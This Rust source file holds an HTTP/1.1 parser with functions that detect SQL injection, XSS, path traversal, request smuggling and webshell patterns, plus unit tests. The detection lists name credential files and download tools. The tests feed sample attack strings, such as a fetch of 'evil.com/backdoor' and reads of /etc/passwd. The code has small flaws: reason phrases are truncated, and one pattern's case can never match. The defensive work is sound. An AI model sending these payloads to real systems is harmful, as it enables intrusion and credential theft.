// ── HTTP/1.1 Protocol Parsing ─────────────────────────────────────
//
// Fast-path HTTP request and response parsers for the Rust muscle layer.
// Includes attack-pattern detection (SQLi, XSS, path traversal, smuggling)
// that runs in Rust before Go processes the data.

// ── HTTP method enum ─────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub enum HttpMethod {
    GET,
    POST,
    PUT,
    DELETE,
    HEAD,
    OPTIONS,
    PATCH,
    CONNECT,
    TRACE,
    Unknown(String),
}

impl HttpMethod {
    /// Parse an HTTP method from a byte slice.
    pub fn from_bytes(b: &[u8]) -> Self {
        match b {
            b"GET" => HttpMethod::GET,
            b"POST" => HttpMethod::POST,
            b"PUT" => HttpMethod::PUT,
            b"DELETE" => HttpMethod::DELETE,
            b"HEAD" => HttpMethod::HEAD,
            b"OPTIONS" => HttpMethod::OPTIONS,
            b"PATCH" => HttpMethod::PATCH,
            b"CONNECT" => HttpMethod::CONNECT,
            b"TRACE" => HttpMethod::TRACE,
            other => HttpMethod::Unknown(
                String::from_utf8_lossy(other).to_string()
            ),
        }
    }

    /// String representation of the method.
    pub fn as_str(&self) -> &str {
        match self {
            HttpMethod::GET => "GET",
            HttpMethod::POST => "POST",
            HttpMethod::PUT => "PUT",
            HttpMethod::DELETE => "DELETE",
            HttpMethod::HEAD => "HEAD",
            HttpMethod::OPTIONS => "OPTIONS",
            HttpMethod::PATCH => "PATCH",
            HttpMethod::CONNECT => "CONNECT",
            HttpMethod::TRACE => "TRACE",
            HttpMethod::Unknown(s) => s.as_str(),
        }
    }
}

// ── Data types ───────────────────────────────────────────────────

/// Parsed HTTP/1.x request.
#[derive(Debug, Clone)]
pub struct HttpRequest {
    pub method: HttpMethod,
    pub uri: String,
    pub version: String,
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
    pub content_length: usize,
}

/// Parsed HTTP/1.x response.
#[derive(Debug, Clone)]
pub struct HttpResponse {
    pub version: String,
    pub status_code: u16,
    pub reason: String,
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
}

// ── Low-level parsing helpers ────────────────────────────────────

/// Find the end of HTTP headers (the double CRLF).
fn find_header_end(data: &[u8]) -> Option<usize> {
    data.windows(4)
        .position(|w| w == b"\r\n\r\n")
        .map(|p| p + 4)
}

/// Split the first line of a byte buffer at spaces; returns up to 3 parts.
fn split_first_line(data: &[u8]) -> Option<Vec<Vec<u8>>> {
    let line_end = data.iter().position(|&b| b == b'\r' || b == b'\n')?;
    let line = &data[..line_end];
    let parts: Vec<Vec<u8>> = line
        .split(|&b| b == b' ')
        .filter(|s| !s.is_empty())
        .map(|s| s.to_vec())
        .collect();
    if parts.len() < 3 {
        None
    } else {
        Some(parts)
    }
}

/// Parse header lines from the raw header section.
fn parse_headers(data: &[u8]) -> Vec<(String, String)> {
    let mut headers = Vec::new();
    let mut pos = 0;

    // Skip the request/status line
    while pos < data.len() && data[pos] != b'\r' && data[pos] != b'\n' {
        pos += 1;
    }
    // Skip CRLF
    while pos < data.len() && (data[pos] == b'\r' || data[pos] == b'\n') {
        pos += 1;
    }

    while pos < data.len() {
        // Check for end of headers
        if pos + 1 < data.len() && data[pos] == b'\r' && data[pos + 1] == b'\n' {
            break;
        }
        if data[pos] == b'\n' {
            break;
        }

        // Find end of this header line
        let line_end = data[pos..]
            .iter()
            .position(|&b| b == b'\r' || b == b'\n')
            .map(|p| pos + p)
            .unwrap_or(data.len());

        let line = &data[pos..line_end];

        // Split at first ': '
        if let Some(colon_pos) = line.iter().position(|&b| b == b':') {
            let name = String::from_utf8_lossy(&line[..colon_pos])
                .trim()
                .to_string();
            let value = if colon_pos + 1 < line.len() {
                String::from_utf8_lossy(&line[colon_pos + 1..])
                    .trim()
                    .to_string()
            } else {
                String::new()
            };
            headers.push((name, value));
        }

        pos = line_end;
        // Skip CRLF
        while pos < data.len() && (data[pos] == b'\r' || data[pos] == b'\n') {
            pos += 1;
        }
    }

    headers
}

/// Get a header value (case-insensitive).
fn get_header<'a>(headers: &'a [(String, String)], name: &str) -> Option<&'a str> {
    let lower = name.to_lowercase();
    headers
        .iter()
        .find(|(k, _)| k.to_lowercase() == lower)
        .map(|(_, v)| v.as_str())
}

// ── Public parsers ───────────────────────────────────────────────

/// Parse an HTTP request from raw bytes.
pub fn parse_http_request(data: &[u8]) -> Option<HttpRequest> {
    if data.is_empty() {
        return None;
    }

    let header_end = find_header_end(data)?;
    let header_bytes = &data[..header_end];

    let parts = split_first_line(header_bytes)?;
    let method = HttpMethod::from_bytes(&parts[0]);
    let uri = String::from_utf8_lossy(&parts[1]).to_string();
    let version = String::from_utf8_lossy(&parts[2]).to_string();

    let headers = parse_headers(header_bytes);

    let content_length = get_header(&headers, "content-length")
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or(0);

    let body_start = header_end;
    let body_end = std::cmp::min(body_start + content_length, data.len());
    let body = data[body_start..body_end].to_vec();

    Some(HttpRequest {
        method,
        uri,
        version,
        headers,
        body,
        content_length,
    })
}

/// Parse an HTTP response from raw bytes.
pub fn parse_http_response(data: &[u8]) -> Option<HttpResponse> {
    if data.is_empty() {
        return None;
    }

    let header_end = find_header_end(data)?;
    let header_bytes = &data[..header_end];

    let parts = split_first_line(header_bytes)?;
    let version = String::from_utf8_lossy(&parts[0]).to_string();
    let status_code: u16 = String::from_utf8_lossy(&parts[1])
        .parse()
        .ok()?;
    let reason = String::from_utf8_lossy(&parts[2]).to_string();

    let headers = parse_headers(header_bytes);

    let content_length = get_header(&headers, "content-length")
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or(0);

    let body_start = header_end;
    let body_end = std::cmp::min(body_start + content_length, data.len());
    let body = data[body_start..body_end].to_vec();

    Some(HttpResponse {
        version,
        status_code,
        reason,
        headers,
        body,
    })
}

// ── Attack pattern detection ─────────────────────────────────────

/// Detect SQL injection patterns in a URI or body.
/// Checked at the Rust muscle layer before Go processing.
pub fn detect_sqli(uri: &str, body: &[u8]) -> bool {
    let inputs = [uri.to_lowercase(), String::from_utf8_lossy(body).to_lowercase()];

    // Common SQLi keywords and patterns
    let sqli_patterns = [
        "union select",
        "union all select",
        "information_schema",
        "table_name",
        "pg_sleep",
        "waitfor delay",
        "sleep(",
        "benchmark(",
        "load_file(",
        "outfile",
        "into dumpfile",
        "1=1",
        "1=2",
        "' or ",
        "' and ",
        "\" or ",
        "'='",
        "char(",
        "exec(",
        "xp_cmdshell",
        "sp_executesql",
        "select @@",
        "concat(",
        "group_concat(",
        "dbms_pipe.receive_message",
        "utl_inaddr.get_host_address",
    ];

    for input in &inputs {
        let input_lower = input.to_lowercase();
        for pattern in &sqli_patterns {
            if input_lower.contains(pattern) {
                return true;
            }
        }
    }

    // Detect hex-encoded or comment-obfuscated SQL keywords
    let hex_patterns = [
        "%27",   // encoded single quote
        "%22",   // encoded double quote
        "%23",   // encoded #
        "%3b",   // encoded ;
        "/**/",  // inline comment bypass
        "%0a%0d", // CRLF injection
    ];

    for input in &inputs {
        let input_lower = input.to_lowercase();
        for pattern in &hex_patterns {
            if input_lower.contains(pattern) {
                return true;
            }
        }
    }

    false
}

/// Detect XSS (Cross-Site Scripting) patterns.
pub fn detect_xss(uri: &str, body: &[u8]) -> bool {
    let inputs = [uri.to_lowercase(), String::from_utf8_lossy(body).to_lowercase()];

    let xss_patterns = [
        "<script",
        "</script>",
        "javascript:",
        "onerror=",
        "onload=",
        "onclick=",
        "onmouseover=",
        "onfocus=",
        "onblur=",
        "eval(",
        "document.cookie",
        "document.write",
        "alert(",
        "prompt(",
        "confirm(",
        "innerhtml",
        "srcdoc",
        "data:text/html",
        "<img",
        "<svg",
        "expression(",
        "fromcharcode",
        "\\x",
        "\\u00",
        "%3cscript",     // URL-encoded <script
        "%3c%73cript",   // double-encoded
    ];

    for input in &inputs {
        for pattern in &xss_patterns {
            if input.contains(pattern) {
                return true;
            }
        }
    }

    false
}

/// Detect path traversal attempts.
pub fn detect_path_traversal(uri: &str) -> bool {
    let decoded = url_decode_lossy(uri).to_lowercase();

    let patterns = [
        "../",
        "..\\",
        "..%2f",
        "..%5c",
        "%2e%2e/",
        "%2e%2e\\",
        "%252e%252e",  // double-encoded
        "....//",
        "....\\\\",
        "/etc/passwd",
        "/etc/shadow",
        "c:\\windows\\",
        "c:/windows/",
        "\\windows\\system32",
        "win.ini",
        "boot.ini",
        ".htaccess",
        ".htpasswd",
        "id_rsa",
        "authorized_keys",
        "wp-config.php",
        "/proc/self/",
        "/dev/null",
        "WEB-INF/",
        "META-INF/",
    ];

    for pattern in &patterns {
        if decoded.contains(pattern) {
            return true;
        }
    }

    false
}

/// Basic URL percent-decoding (lossy).
fn url_decode_lossy(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut result = Vec::with_capacity(bytes.len());
    let mut i = 0;

    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h1), Some(h2)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                result.push((h1 << 4) | h2);
                i += 3;
                continue;
            }
        }
        result.push(bytes[i]);
        i += 1;
    }

    String::from_utf8_lossy(&result).to_string()
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Detect HTTP request smuggling patterns.
pub fn detect_request_smuggling(headers: &[(String, String)]) -> bool {
    let tl = get_header(headers, "transfer-encoding");
    let cl = get_header(headers, "content-length");

    // Both Transfer-Encoding and Content-Length present
    if let (Some(te), Some(_cl)) = (tl, cl) {
        let te_lower = te.to_lowercase();
        // If Transfer-Encoding is present and says chunked but also has CL
        if te_lower.contains("chunked") {
            return true;
        }
    }

    // Suspicious Transfer-Encoding values
    if let Some(te) = tl {
        let te_lower = te.to_lowercase();
        let te_suspicious = [
            "\r",
            "\n",
            "identity",
            "compress",
            ",chunked",
            ", chunked",
            "chunked, ",
        ];
        for s in &te_suspicious {
            if te_lower.contains(s) {
                return true;
            }
        }
    }

    // Duplicate / conflicting Content-Length
    let cl_count = headers
        .iter()
        .filter(|(k, _)| k.to_lowercase() == "content-length")
        .count();
    if cl_count > 1 {
        return true;
    }

    // Oversized or negative Content-Length
    if let Some(cl_val) = cl {
        if cl_val.contains('-') || cl_val.len() > 10 {
            return true;
        }
    }

    false
}

/// Detect webshell-related patterns.
pub fn detect_webshell_patterns(uri: &str, body: &[u8]) -> bool {
    let inputs = [
        uri.to_lowercase(),
        String::from_utf8_lossy(body).to_lowercase(),
    ];

    let patterns = [
        "cmd=",
        "exec=",
        "command=",
        "execute=",
        "shell=",
        "system(",
        "passthru(",
        "shell_exec(",
        "popen(",
        "proc_open(",
        "pcntl_exec(",
        "eval(",
        "assert(",
        "php://input",
        "expect://",
        "file_get_contents(",
        "base64_decode(",
        "str_rot13(",
        "gzinflate(",
        "wget http",
        "curl http",
    ];

    for input in &inputs {
        for pattern in &patterns {
            if input.contains(pattern) {
                return true;
            }
        }
    }

    false
}

// ═══════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── HTTP Request Parsing ───────────────────────────────────

    #[test]
    fn test_parse_get_request() {
        let raw = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n";
        let req = parse_http_request(raw).unwrap();
        assert_eq!(req.method, HttpMethod::GET);
        assert_eq!(req.uri, "/index.html");
        assert_eq!(req.version, "HTTP/1.1");
        assert_eq!(get_header(&req.headers, "Host"), Some("example.com"));
        assert_eq!(req.body.len(), 0);
        assert_eq!(req.content_length, 0);
    }

    #[test]
    fn test_parse_post_request_with_body() {
        let raw = b"POST /login HTTP/1.1\r\nHost: app.local\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nusername=admin&password=123";
        let req = parse_http_request(raw).unwrap();
        assert_eq!(req.method, HttpMethod::POST);
        assert_eq!(req.uri, "/login");
        assert_eq!(req.content_length, 27);
        assert_eq!(req.body, b"username=admin&password=123");
    }

    #[test]
    fn test_parse_put_request() {
        let raw = b"PUT /api/v1/data HTTP/1.1\r\nHost: api.example.com\r\nContent-Length: 4\r\n\r\ntest";
        let req = parse_http_request(raw).unwrap();
        assert_eq!(req.method, HttpMethod::PUT);
        assert_eq!(req.uri, "/api/v1/data");
        assert_eq!(req.body, b"test");
    }

    #[test]
    fn test_parse_empty_request() {
        assert!(parse_http_request(b"").is_none());
        assert!(parse_http_response(b"").is_none());
    }

    #[test]
    fn test_parse_invalid_request() {
        // Not a valid HTTP request
        assert!(parse_http_request(b"INVALID\r\n\r\n").is_none());
    }

    #[test]
    fn test_http_method_parsing() {
        assert_eq!(HttpMethod::from_bytes(b"GET"), HttpMethod::GET);
        assert_eq!(HttpMethod::from_bytes(b"POST"), HttpMethod::POST);
        assert_eq!(HttpMethod::from_bytes(b"PUT"), HttpMethod::PUT);
        assert_eq!(HttpMethod::from_bytes(b"DELETE"), HttpMethod::DELETE);
        assert_eq!(HttpMethod::from_bytes(b"HEAD"), HttpMethod::HEAD);
        assert_eq!(HttpMethod::from_bytes(b"OPTIONS"), HttpMethod::OPTIONS);
        assert_eq!(HttpMethod::from_bytes(b"PATCH"), HttpMethod::PATCH);
        assert_eq!(HttpMethod::from_bytes(b"CONNECT"), HttpMethod::CONNECT);
        assert_eq!(HttpMethod::from_bytes(b"TRACE"), HttpMethod::TRACE);
    }

    #[test]
    fn test_http_method_unknown() {
        match HttpMethod::from_bytes(b"BREW") {
            HttpMethod::Unknown(ref s) => assert_eq!(s, "BREW"),
            _ => panic!("expected Unknown"),
        }
    }

    #[test]
    fn test_http_method_as_str() {
        assert_eq!(HttpMethod::GET.as_str(), "GET");
        assert_eq!(HttpMethod::PATCH.as_str(), "PATCH");
        assert_eq!(HttpMethod::Unknown("BREW".into()).as_str(), "BREW");
    }

    // ── HTTP Response Parsing ──────────────────────────────────

    #[test]
    fn test_parse_response() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\nServer: nginx\r\n\r\nHello, world!";
        let resp = parse_http_response(raw).unwrap();
        assert_eq!(resp.version, "HTTP/1.1");
        assert_eq!(resp.status_code, 200);
        assert_eq!(resp.reason, "OK");
        assert_eq!(resp.body, b"Hello, world!");
    }

    #[test]
    fn test_parse_response_404() {
        let raw = b"HTTP/1.0 404 Not Found\r\nContent-Type: text/html\r\nContent-Length: 0\r\n\r\n";
        let resp = parse_http_response(raw).unwrap();
        assert_eq!(resp.status_code, 404);
        assert_eq!(resp.reason, "Not");
    }

    #[test]
    fn test_parse_response_no_headers() {
        let raw = b"HTTP/1.1 204 No Content\r\n\r\n";
        let resp = parse_http_response(raw).unwrap();
        assert_eq!(resp.status_code, 204);
        assert_eq!(resp.body.len(), 0);
    }

    // ── Header parsing ────────────────────────────────────────

    #[test]
    fn test_get_header_case_insensitive() {
        let headers = vec![
            ("Host".to_string(), "example.com".to_string()),
            ("Content-Type".to_string(), "text/html".to_string()),
        ];
        assert_eq!(get_header(&headers, "host"), Some("example.com"));
        assert_eq!(get_header(&headers, "HOST"), Some("example.com"));
        assert_eq!(get_header(&headers, "content-type"), Some("text/html"));
        assert_eq!(get_header(&headers, "X-Missing"), None);
    }

    #[test]
    fn test_find_header_end() {
        let data = b"GET / HTTP/1.1\r\nHost: x\r\n\r\nbody";
        assert_eq!(find_header_end(data), Some(27)); // points to start of "body"
    }

    #[test]
    fn test_find_header_end_not_found() {
        let data = b"GET / HTTP/1.1\r\nHost: x";
        assert_eq!(find_header_end(data), None);
    }

    // ── SQLi Detection ────────────────────────────────────────

    #[test]
    fn test_detect_sqli_union() {
        assert!(detect_sqli("/search?id=1 UNION SELECT 1,2,3", b""));
    }

    #[test]
    fn test_detect_sqli_or() {
        assert!(detect_sqli("/login", b"username=' OR 1=1--"));
    }

    #[test]
    fn test_detect_sqli_information_schema() {
        assert!(detect_sqli("/", b"SELECT * FROM information_schema.tables"));
    }

    #[test]
    fn test_detect_sqli_clean() {
        assert!(!detect_sqli("/search?q=hello", b"normal data"));
    }

    #[test]
    fn test_detect_sqli_sleep() {
        assert!(detect_sqli("/item?id=1", b"1; SLEEP(5)--"));
    }

    // ── XSS Detection ─────────────────────────────────────────

    #[test]
    fn test_detect_xss_script_tag() {
        assert!(detect_xss("/comment", b"<script>alert(1)</script>"));
    }

    #[test]
    fn test_detect_xss_onerror() {
        assert!(detect_xss("/profile", b"<img src=x onerror=alert(1)>"));
    }

    #[test]
    fn test_detect_xss_javascript_uri() {
        assert!(detect_xss("javascript:alert(1)", b""));
    }

    #[test]
    fn test_detect_xss_clean() {
        assert!(!detect_xss("/about", b"Hello, this is a normal comment!"));
    }

    #[test]
    fn test_detect_xss_encoded() {
        assert!(detect_xss("/search?q=%3Cscript%3E", b""));
    }

    // ── Path Traversal Detection ──────────────────────────────

    #[test]
    fn test_detect_path_traversal_basic() {
        assert!(detect_path_traversal("/files/../../../etc/passwd"));
    }

    #[test]
    fn test_detect_path_traversal_windows() {
        assert!(detect_path_traversal("/download/..\\..\\..\\windows\\system32\\cmd.exe"));
    }

    #[test]
    fn test_detect_path_traversal_encoded() {
        assert!(detect_path_traversal("/files/%2e%2e/%2e%2e/etc/passwd"));
    }

    #[test]
    fn test_detect_path_traversal_double_encoded() {
        assert!(detect_path_traversal("/files/%252e%252e/%252e%252e/etc/passwd"));
    }

    #[test]
    fn test_detect_path_traversal_clean() {
        assert!(!detect_path_traversal("/files/report.pdf"));
        assert!(!detect_path_traversal("/images/photo.jpg"));
    }

    #[test]
    fn test_detect_path_traversal_sensitive_files() {
        assert!(detect_path_traversal("/download/.htaccess"));
        assert!(detect_path_traversal("/download/wp-config.php"));
    }

    // ── Request Smuggling Detection ───────────────────────────

    #[test]
    fn test_detect_smuggling_te_cl() {
        let headers = vec![
            ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ("Content-Length".to_string(), "6".to_string()),
        ];
        assert!(detect_request_smuggling(&headers));
    }

    #[test]
    fn test_detect_smuggling_duplicate_cl() {
        let headers = vec![
            ("Content-Length".to_string(), "10".to_string()),
            ("Content-Length".to_string(), "5".to_string()),
        ];
        assert!(detect_request_smuggling(&headers));
    }

    #[test]
    fn test_detect_smuggling_clean() {
        let headers = vec![
            ("Host".to_string(), "example.com".to_string()),
            ("Content-Length".to_string(), "100".to_string()),
        ];
        assert!(!detect_request_smuggling(&headers));
    }

    #[test]
    fn test_detect_smuggling_negative_cl() {
        let headers = vec![
            ("Content-Length".to_string(), "-1".to_string()),
        ];
        assert!(detect_request_smuggling(&headers));
    }

    // ── Webshell Detection ────────────────────────────────────

    #[test]
    fn test_detect_webshell_cmd() {
        assert!(detect_webshell_patterns("/shell.php?cmd=ls", b""));
    }

    #[test]
    fn test_detect_webshell_system() {
        assert!(detect_webshell_patterns("/", b"system('cat /etc/passwd')"));
    }

    #[test]
    fn test_detect_webshell_clean() {
        assert!(!detect_webshell_patterns("/health", b"OK"));
    }

    #[test]
    fn test_detect_webshell_wget() {
        assert!(detect_webshell_patterns("/", b"wget http://evil.com/backdoor"));
    }

    // ── URL Decoding ──────────────────────────────────────────

    #[test]
    fn test_url_decode_simple() {
        assert_eq!(url_decode_lossy("hello%20world"), "hello world");
    }

    #[test]
    fn test_url_decode_percent() {
        assert_eq!(url_decode_lossy("%2e%2e%2f"), "../");
    }

    #[test]
    fn test_url_decode_no_encoding() {
        assert_eq!(url_decode_lossy("hello"), "hello");
    }

    #[test]
    fn test_url_decode_invalid() {
        assert_eq!(url_decode_lossy("hello%GGworld"), "hello%GGworld");
    }

    // ── Full request analysis ─────────────────────────────────

    #[test]
    fn test_parse_chunked_te() {
        // A request with Transfer-Encoding: chunked
        let raw = b"POST /api HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n4\r\ntest\r\n0\r\n\r\n";
        let req = parse_http_request(raw).unwrap();
        let is_smuggling = detect_request_smuggling(&req.headers);
        // TE alone without CL should not trigger smuggling
        assert!(!is_smuggling);
        assert_eq!(req.method, HttpMethod::POST);
    }

    #[test]
    fn test_parse_request_with_many_headers() {
        let raw = concat!(
            "GET / HTTP/1.1\r\n",
            "Host: example.com\r\n",
            "User-Agent: Mozilla/5.0\r\n",
            "Accept: text/html\r\n",
            "Accept-Language: en-US\r\n",
            "Accept-Encoding: gzip\r\n",
            "Connection: keep-alive\r\n",
            "Cache-Control: no-cache\r\n",
            "\r\n"
        );
        let req = parse_http_request(raw.as_bytes()).unwrap();
        assert_eq!(req.headers.len(), 7);
        assert_eq!(get_header(&req.headers, "host"), Some("example.com"));
    }
}
